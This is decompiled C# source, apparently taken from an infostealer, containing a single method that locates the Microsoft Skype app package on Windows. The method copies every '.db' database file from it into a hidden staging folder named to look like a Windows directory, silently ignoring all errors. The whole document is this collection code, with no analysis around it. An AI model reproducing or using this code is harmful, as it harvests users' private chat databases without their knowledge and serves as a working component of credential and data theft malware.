using System;
using System.IO;

namespace skypemsg
{
	// Token: 0x02000004 RID: 4
	internal class skype
	{
		// Token: 0x06000005 RID: 5 RVA: 0x000024F8 File Offset: 0x000006F8
		public static void skypelog()
		{
			try
			{
				string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Packages";
				string[] directories = Directory.GetDirectories(path);
				for (int i = 0; i < directories.Length; i++)
				{
					bool flag = directories[i].StartsWith(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Packages\\Microsoft.SkypeApp");
					if (flag)
					{
						string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Windows/Skype";
						try
						{
							Directory.CreateDirectory(text);
							string[] files = Directory.GetFiles(directories[i] + "\\LocalState");
							foreach (string text2 in files)
							{
								bool flag2 = text2.Contains(".db");
								if (flag2)
								{
									File.Copy(text2, text + "/" + Path.GetFileName(text2));
								}
							}
						}
						catch
						{
						}
					}
				}
			}
			catch
			{
			}
		}
	}
}
